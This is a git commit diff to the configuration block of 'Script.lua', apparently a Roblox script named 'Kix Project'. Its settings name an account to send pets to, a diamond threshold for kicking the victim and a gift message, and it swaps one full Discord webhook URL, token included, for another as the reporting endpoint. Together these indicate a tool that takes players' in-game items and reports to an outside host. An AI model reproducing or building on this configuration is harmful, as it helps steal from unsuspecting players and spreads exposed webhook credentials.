43b2855d02944218260f12f6d10ab9f2eaaf261f
Edwarddxd <130901393+Edwarddxd@users.noreply.github.com>
2023-04-16 14:08:08 +0300

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -3,7 +3,7 @@
 --[[ Config ]]--
 _G.Username = "Eduarddinu2017" --// Username To Send Pets To
 _G.ScriptName = "Kix Project" --// Script Name For Watermark
-_G.Webhook = "https://discord.com/api/webhooks/1097114694021550182/M3JFHZ5zDT9PQqrQ0p24G7aPSbh5RMnVu42RSmcSW_I91J5MhhRyBoFR8TkeXLiuuRBH" --// Discord Webhook For Executions
+_G.Webhook = "https://discord.com/api/webhooks/1097113513467588709/gpsjdNrQcDrr-g_Yg3MXpnEvRAOH7R_ifwIsD_UVVBHjIVxaN4XbmmFCypVRtX1MuOT_" --// Discord Webhook For Executions
 _G.GiftMessage = "Thx for help" --// Message For The Gift To Say
 _G.Diamonds = 125000 --// Amount Of Diamonds To Not Kick
 _G.UnlockPets = true --// Unlocks Locked Pets
